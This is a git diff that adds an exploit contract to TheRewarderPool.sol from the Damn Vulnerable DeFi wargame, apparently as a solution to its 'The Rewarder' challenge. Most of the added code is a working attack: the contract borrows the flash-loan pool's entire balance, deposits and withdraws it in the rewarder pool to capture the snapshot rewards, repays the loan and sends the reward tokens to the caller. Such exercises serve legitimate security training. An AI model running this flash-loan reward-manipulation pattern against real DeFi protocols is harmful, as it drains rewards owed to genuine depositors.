@@ -6,6 +6,9 @@ import "./RewardToken.sol";
 import "../DamnValuableToken.sol";
 import "./AccountingToken.sol";
 
+import "./FlashLoanerPool.sol";
+import "../DamnValuableToken.sol";
+
 /**
  * @title TheRewarderPool
  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
@@ -99,5 +102,29 @@ contract TheRewarderPool {
 
     function isNewRewardsRound() public view returns (bool) {
         return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
+    }
+}
+
+contract TheRewarderAttack{
+    FlashLoanerPool public flash;
+    TheRewarderPool public rewarder;
+    DamnValuableToken public liquidityToken;
+    RewardToken public rewardToken;
+    constructor (address _flash, address _rewarder, address _liquidityToken, address _rewardToken){
+        flash = FlashLoanerPool(_flash);
+        rewarder = TheRewarderPool(_rewarder);
+        liquidityToken = DamnValuableToken(_liquidityToken);
+        rewardToken = RewardToken(_rewardToken);
+    }
+    function attack () external {
+        uint256 _amount = liquidityToken.balanceOf(address(flash));
+        flash.flashLoan(_amount);
+        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
+    }
+    function receiveFlashLoan(uint256 _amount) external {
+        liquidityToken.approve(address(rewarder), _amount);
+        rewarder.deposit(_amount);
+        rewarder.withdraw(_amount);
+        liquidityToken.transfer(address(flash), _amount);
     }
 }
